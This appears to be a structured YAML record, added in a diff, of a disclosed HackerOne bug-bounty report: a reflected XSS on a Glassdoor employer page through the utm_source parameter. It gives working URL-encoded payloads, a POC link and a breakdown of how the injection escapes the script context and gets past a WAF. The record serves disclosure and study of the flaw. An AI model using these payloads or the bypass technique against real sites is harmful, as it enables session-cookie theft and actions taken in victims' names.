@@ -1,0 +1,38 @@
+---
+h1_report_id: 846338
+type: XSS
+tags: []
+title: "Reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/"
+cve-id: ""
+bug_paid: 1000
+severity: "medium"
+researcher: "parzel"
+reported_data: April 10, 2020
+program: "glassdoor"
+urls:
+  [
+    "https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e",
+    https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=%60%2balert/**/(1)%2b%60,
+  ]
+method: "GET"
+parameters: ["utm_resource"]
+payloads:
+  [
+    '"abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e',
+    "%60%2balert/**/(1)%2b%60",
+  ]
+summary: |-
+  There is a reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/ throgh the utm_source parameter. By using URL encoding I was able to bypass the WAF
+
+poc: |-
+  1. Visit to the following POC link
+  https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+  Explanation
+  abc`;return+false});});alert`xss`;</script>
+  abc`;  -> finish the string
+  return+false}); -> finish the jQuery ready function
+  alert`xss`; -> execute the code 
+  </script> -> close the script tag to prevent JS parsing error
+
+impact: |-
+  A XSS attack allows an attacker to execute arbitary JS in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phisihing attacks.
